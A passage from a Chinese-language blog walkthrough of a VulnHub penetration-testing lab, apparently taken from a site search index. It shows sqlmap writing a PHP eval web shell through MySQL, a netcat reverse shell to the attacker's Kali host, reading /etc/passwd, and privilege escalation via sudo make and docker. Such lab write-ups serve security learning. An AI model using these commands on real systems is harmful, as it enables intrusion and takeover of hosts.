[INFO] calling Linux OS shell. To quit type 'x' or 'q' and press ENTERos-shell>os-shell> whoamido you want to retrieve the command standard output? [Y/n/a] aNo outputos-shell><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>尴尬，好像不行的样子，这nm可咋办。看看答案……</p><p><img src="2.jpg" alt></p><p>哦<del>忽略了一个东西</del>还有一个8080端口，访问一下，提示当前目录是 /var/tmp，可以借助mysql写木马</p><pre class="line-numbers language-shell"><code class="language-shell">D:\sqlmap>python sqlmap.py -d "mysql://root:password@192.168.234.130:3306/mysql" --sql-shell        ___       __H__ ___ ___[,]_____ ___ ___  {1.4.4.6#dev}|_ -| . [']     | .'| . ||___|_  ["]_|_|_|__,|  _|      |_|V...       |_|   http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting @ 08:34:57 /2020-05-01/[08:35:08] [INFO] connection to MySQL server '192.168.234.130:3306' established[08:35:08] [INFO] testing MySQL[08:35:08] [INFO] resumed: [['1']]...[08:35:08] [INFO] confirming MySQL[08:35:08] [INFO] resumed: [['1']]...[08:35:08] [INFO] the back-end DBMS is MySQLback-end DBMS: MySQL >= 5.0.0 (MariaDB fork)[08:35:08] [INFO] calling MySQL shell. To quit type 'x' or 'q' and press ENTERsql-shell> select @@version;[08:35:47] [INFO] fetching SQL SELECT statement query output: 'select @@version'select @@version [1]:[*] 10.3.18-MariaDB-0+deb10u1sql-shell>sql-shell> select user();[08:36:12] [INFO] fetching SQL SELECT statement query output: 'select user()'select user() [1]:[*] root@192.168.234.1sql-shell>sql-shell> select "\<?php eval($_POST['ALing']); ?\>" into outfile "/var/tmp/ALing.php";[08:39:34] [INFO] executing SQL SELECT statement statement: 'select "\<?php eval($_POST['ALing']); ?\>" into outfile "/var/tmp/ALing.php"'select "\<?php eval($_POST['ALing']); ?\>" into outfile "/var/tmp/ALing.php": 'NULL'sql-shell><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查看刚刚的8080 web页面写入成功了，网站管理工具连接，试了一下，基本上什么都干不了</p><p><img src="3.PNG" alt></p><p>看到连接成功了，下一步，提权，我还不是很会！（看看答案）</p><p><img src="4.jpg" alt></p><p>先反弹一个shell，说明一下，上传的木马是通过post传值的，要利用的需要burp抓包改包。我觉得麻烦就又传了一个通过get传参，可以直接在url里搞，方便一点</p><p>kali监听：nc -lvp 1911</p><p>浏览器访问木马：192.168.234.130:8080/aling.php?ALing=system(“nc -e /bin/bash kali_ip 1911”);</p><p>连好后，查看用户：cat /etc/passwd</p><pre class="line-numbers language-shell"><code class="language-shell">cat /etc/passwdroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin_apt:x:100:65534::/nonexistent:/usr/sbin/nologinsystemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologinsystemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologinsystemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologinmessagebus:x:104:110::/nonexistent:/usr/sbin/nologinavahi-autoipd:x:105:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologinsshd:x:106:65534::/run/sshd:/usr/sbin/nologinavahi:x:107:117:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologinsaned:x:108:118::/var/lib/saned:/usr/sbin/nologincolord:x:109:119:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologinhplip:x:110:7:HPLIP system user,,,:/var/run/hplip:/bin/falsedusk:x:1000:1000:dusk,,,:/home/dusk:/bin/bashsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologinmysql:x:111:120:MySQL Server,,,:/nonexistent:/bin/falsepostfix:x:112:121::/var/spool/postfix:/usr/sbin/nologin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看到有 root 用户和 dusk 用户，而我们现在是 www-data 用户</p><p>sudo -l 看看自己有啥权限</p><pre class="line-numbers language-shell"><code class="language-shell">sudo -lMatching Defaults entries for www-data on dusk:    env_reset, mail_badpass,    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/binUser www-data may run the following commands on dusk:    (dusk) NOPASSWD: /usr/bin/ping, /usr/bin/make, /usr/bin/sl<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看到可以用三个命令，sl 是个跑火车的命令，make是可以用来提权的</p><p>先了解一哈make：<strong><a href="https://gtfobins.github.io/gtfobins/make/" target="_blank" rel="noopener">你点我呀</a></strong></p><p>照做就可以了</p><pre class="line-numbers language-shell"><code class="language-shell">sudo -u dusk make --eval=$'x:\n\t'/bin/shwhoami dusk<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>看到已经是dusk用户了</p><p>可是还是有些命令执行不了，用id命令看看 dusk都属于那些组</p><pre class="line-numbers language-shell"><code class="language-shell">id uid=1000(dusk) gid=1000(dusk) groups=1000(dusk),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),115(lpadmin),116(scanner),123(docker)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>看到有好多组，其中有一个 docker 组，其他的我也不会，照着网上大哥的步骤 docker 阔以提权 <strong><a href="https://gtfobins.github.io/gtfobins/docker/" target="_blank" rel="noopener">你点我呀</a></strong></p><p>尴尬的一批！我的kali是仅主机模式，没法加载docker，虽然可以把物理机的网卡共享给虚拟机，但是我要去吃饭了，不管了。有条件的同学还是用桥接模式吧。</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
